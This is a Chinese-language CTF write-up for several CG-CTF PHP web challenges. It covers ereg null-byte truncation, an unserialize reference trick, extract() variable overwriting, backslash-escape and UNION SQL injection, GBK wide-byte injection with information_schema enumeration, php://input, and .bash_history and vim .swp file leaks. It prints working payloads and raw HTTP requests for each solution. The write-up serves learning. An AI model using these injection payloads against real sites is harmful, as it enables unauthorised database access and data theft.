---
title: CG-CTF_wp
date: 2020-02-02
image: 
description: 
categories: 
- ctf_writeup
tags:
- PHP特性
---
![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164539.jpeg)

cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：

### [\0x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)

考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）

题目直接给源码：

```
view-source:
    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
```

- 这里ereg有两个漏洞：

①%00截断及遇到%00则默认为字符串的结束

②当ntf为数组时它的返回值不是FALSE

```
法一：数组绕过
index.php?nctf[]=#biubiubiu
法二：\x00截断
index.php?nctf=1%00%23biubiubiu
```

nctf{use_00_to_jieduan}

 

 

 

### [php 反序列化(暂时无法做)](http://4.chinalover.sinaapp.com/web25/index.php)

考点：对象包含的引用在序列化时也会被存储

题目源码：

```
<?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    
    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }
    
    $o = unserialize($pass);
    
    if ($o) {
        $o->secret = "*";
        if ($o->secret === $o->enter)
            echo "Congratulation! Here is my secret: ".$o->secret;
        else 
            echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";
?>
```

反序列化后，secret会被重新赋值为一个未知的值，但要求enter跟secret的值一致才能拿到flag。

- 对象包含的引用在序列化时也会被存储

编写脚本：

```
<?php
class just4fun {
    var $enter;
    var $secret;
}

$a= new just4fun;

$a->enter=&$a->secret;

echo serialize($a);
?>
```

执行得到：

```
O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
```

GET传值过去：

```
http://4.chinalover.sinaapp.com/web25/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}
```

得到：

```
Congratulation! Here is my secret: thisisnctfsecret
```

 

 

 

### [变量覆盖](http://chinalover.sinaapp.com/web18/)

考点：变量覆盖漏洞

题目关键部分源码：

```
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
                        <?php
                        extract($_POST);
                        if ($pass == $thepassword_123) { ?>
                            <div class="alert alert-success">
                                <code><?php echo $theflag; ?></code>
                            </div>
                        <?php } ?>
<?php } ?>
```

整理为：

```
<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
                        extract($_POST);
                        if ($pass == $thepassword_123) {
                             echo $theflag;
                        }
}

?>
```

- 变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract(), parse_str() 和 import_request_variables()

 

**extract()变量覆盖**

- *extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。*

```
<?php

$auth = '0';
extract($_GET)；

if($auth==1){
echo "private!";
}else{
echo "public!";
}
?>
```

假设用户构造以下链接：http://www.a.com/test1.php?auth=1

则站点会输出“private！”

所以playload是：（burp suite数据包）

```
POST /web18/ HTTP/1.1
Host: chinalover.sinaapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://chinalover.sinaapp.com
Connection: close
Referer: http://chinalover.sinaapp.com/web18/index.php
Upgrade-Insecure-Requests: 1

pass=1&thepassword_123=1
```

nctf{bian_liang_fu_gai!}

 

 

 

### [变量覆盖2](http://chinalover.sinaapp.com/web24/)

考点：遍历初始化变量导致变量覆盖

题目源码：

```
<!--
foreach($_GET as $key => $value){  
        $$key = $value;  
}  
if($name == "meizijiu233"){
    echo $flag;
}
-->
```

（详见本站“[变量覆盖漏洞学习笔记](http://wh1sper.com/变量覆盖漏洞学习笔记/)”）

playload:

```
chinalover.sinaapp.com/web24/?name=meizijiu233
```

nctf{AD3FBD8D5928693CA499347C91570AE6}

 

 

 

### [SQL Injection](http://chinalover.sinaapp.com/web15/index.php)

知识点：PHP代码审计，sql语言基础，\转义单引号

题目：

```
<!--
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
	die('Invalid password!');
}

echo $flag;
-->
Invalid password!
```

- 代码中clean()函数去掉转义，htmlentities($str, ENT_QUOTES)会转换单引号和双引号。这里我们只能通过**引入反斜杠**，**转义原有的单引号**，改变原sql语句的逻辑，导致sql注入。

payload如下：

```
?username=\&password= or 1#//要urlcode编码一下，不然#会被浏览器当作空字符
```

于是sql查询语句为：

```
SELECT * FROM users WHERE
name='\' AND pass='            //此时，\'已被转义为一个字符，不会起到引号的作用
or 1
#'
```

flag:nctf{sql_injection_is_interesting}

 

 

 

### [SQL注入2](http://4.chinalover.sinaapp.com/web6/index.php)

考点：union查询，union查询的时候，返回的结果的列名个第一条查询语句是相同的

#### SQL UNION 语法

```
SELECT column_name(s) FROM table_name1
UNION
SELECT column_name(s) FROM table_name2
```

如果要查询重复的值，可以使用 UNION ALL：

```
SELECT column_name(s) FROM table_name1
UNION ALL
SELECT column_name(s) FROM table_name2
```

#### 实例

列出所有在中国和美国的不同的雇员名：

```
SELECT E_Name FROM Employees_China
UNION
SELECT E_Name FROM Employees_USA
```

#### 结果

| E_Name         |
| -------------- |
| Zhang, Hua     |
| Wang, Wei      |
| Carter, Thomas |
| Yang, Ming     |
| Adams, John    |
| Bush, George   |
| Gates, Bill    |

注意：

- union查询必须和第一句查询语句查询列数相同，不然会出现错误；
- union查询的时候，返回的结果的列名个第一条查询语句是相同的
- union第一条查询失败后会返回第二条的结果，但是列名还是第一条查询的列名

 

此题正是用到了第三条知识点：

```
<html>
<head>
Secure Web Login II
</head>
<body>
 
<?php
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
 
 
<form method=post action=index.php>
<input type=text name=user value="Username">
<input type=password name=pass value="Password">
<input type=submit>
</form>
</body>
<a href="index.phps">Source</a>
</html>
```

意思是查询到的pw和输入的pw（经过md5加密后）相同，则输出flag；

playload：

```
user=' union select md5(1)#
pw=1
```

查询结果其实是：

| pw       |
| -------- |
| md5（1） |

于是输入pw=1即可满足；

nctf{union_select_is_wtf}

 

 

 

### [GBK Injection](http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1)

知识点：

宽字节注入：

当传入的单引号会被反斜杠转义的时候，一般情况下是不存在sql注入漏洞的，但是有一个特例，那就是数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在地址后面先加一个%df，再加单引号，因为**反斜杠的编码为%5c**，然而再GBK编码中，**%df%5c是繁体字“謰”**，所以这个时候，单引号就不会被反斜杠转义，造成注入。

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164611.png)

输入%df之后：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164617.png)

此时已经造成了注入；

先使用order by语句查询出表中有多少列：

```
id=1%df%27+order+by+2%23   //不报错
id=1%df%27+order+by+3%23   //报错，判断列数为2
```

或者使用union查询：

```
id=1%df%27+union+select+null,null%23          //不报错
id=1%df%27+union+select+null,null,null%23     //报错，判断列数为2
```

随后可将null换成查询语句，想要union查询到我们自己输入的语句，需要把1换成-1，

 

 

因为单引号被过滤，所以我们可以使用嵌套查询：

```
-1%df%27%20union+select+null,(select+table_name+from+information_schema.tables+where+table_schema=(select+database())limit+0,1)%23
```

这句可以查到表名，但是只能插一个，想要查到其他的需要更改limit的值

 

 

```
-1%df%27%20union+select+null,(select+column_name+from+information_schema.columns+where+table_schema=(select+database())+and+table_name=(select+table_name+from+information_schema.tables+where+table_schema=(select+database())+limit+0,1)+limit+1,2)%23
```

这句可以查到字段名；

但是这道题我们不推荐这个嵌套查询的方法。

 

 

有一个系统自带的函数：group_concat()（一般是CTF中常用的）:

```
id=-1%df%27%20union+select+null,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23
```

![img](http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-7.png)

直接查到了所有表名；

虽然单引号被过滤了，我们可以使用16进制绕过的方法：

```
id=-1%df%27%20union+select+null,group_concat(column_name)+from+information_schema.columns+where+table_name=0x6e657773%23
```

![img](http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-8.png)

直接查到了news（0x6e657773）表中所有字段名；

在这之后，可以把union中的null替换为查询语句

select 字段名 from 表名

```
id=-1%df%27%20union%20select%20null,flag%20from%20ctf4%23
```

当然其他的表存在假的flag，这个才是真的；

flag{this_is_sqli_flag}

 

 

 

### [file_get_contents](http://chinalover.sinaapp.com/web23/)

知识点：php://input访问POST请求的原始数据的只读流

访问题目，查看源码：

```
<!--$file = $_GET['file'];
if(@file_get_contents($file) == "meizijiu"){
    echo $nctf;
}-->
```

这里使用PHP伪协议php://input访问未处理过的POST数据：

burp suite发包：

```
POST /web23/?file=php://input HTTP/1.1
Host: chinalover.sinaapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 8

meizijiu
```

可以直接得到flag：

nctf{0b021b88527c69e5}

 

 

 

### [综合题](http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php)

考点：JSFuck、命令记录文件.bash_history

打开题目是一串的JSFuck：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164630.png)

直接复制到F12里面的控制台运行，得到：

```
1bc29b36f623ba82aaf6724fd3b16718.php
```

直接访问这个页面：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164641.png)

这里是一个脑洞，

其实他说TIP在他脑袋里，其实就是“head”，暗示了**HTTP头**：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164649.png)

```
tip: history of bash
```

#### [Linux的 用户目录下三个bash文件的作用:](https://blog.csdn.net/u011479200/article/details/86501366)

(.bash_history,.bash_logout,.bash_profile,.bashrc)

这里就只说.bash_history:

- Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。

于是我们访问.bash_history这个文件：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164701.png)

我们继续访问flagbak.zip，就能直接下载这个文件，解压打开就是flag：

nctf{bash_history_means_what}

 

 

### 

### [密码重置2](http://nctf.nuptzj.cn/web14/)

考点：Linux下vi编辑器退出后留下的备份文件、弱类型比较

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164708.png)

查看源码中可以找到admin的邮箱，随意舔一个token后提交得到一个提示fail的页面；

根据题干的提示，这个是用Linux下vi编辑器编辑的；

- 当非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。
- 需要注意的是如果你并没有对文件进行修改，而**只是读取文件，是不会产生.swp文件的**。
- 意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。
- 例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。

参考：https://blog.csdn.net/qq_35405259/article/details/86476663

于是我们可以去访问

```
http://nctf.nuptzj.cn/web14/.submit.php.swp   //submit前面一定有一个"."
```

可以得到submit页面的源码，其中关键部分是：

```
if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```

第2、3行弱类型比较，我们只需要输入token=0000000000（10个）：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120164715.png)

nctf{thanks_to_cumt_bxs}

